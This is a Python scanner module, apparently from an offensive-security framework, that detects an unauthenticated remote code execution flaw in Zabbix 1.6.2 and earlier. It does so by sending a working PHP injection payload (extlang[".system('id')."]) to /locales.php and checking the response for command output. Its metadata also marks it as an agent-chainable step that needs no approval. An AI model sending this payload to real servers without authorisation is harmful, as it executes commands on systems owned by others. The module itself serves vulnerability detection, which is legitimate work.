#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Zabbix locales.php RCE (<= 1.6.2)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Zabbix - locales.php RCE Detection',
        'description': (
            'Detects Zabbix <= 1.6.2 RCE via '
            '/locales.php?download=1&langTo=1&extlang[".system(\'id\')."]=1.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'zabbix', 'rce', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/18189',
        ],
    }

    def run(self):
        for base in ('', '/zabbix'):
            path = (
                f'{base}/locales.php?download=1&langTo=1'
                '&extlang[%22.system(%27id%27).%22]=1'
            )
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if r and re.search(r'uid=\d+.*gid=\d+', r.text or ''):
                self.set_info(
                    severity='critical',
                    reason='Zabbix locales.php RCE',
                    path=f'{base}/locales.php',
                )
                return True
        return False
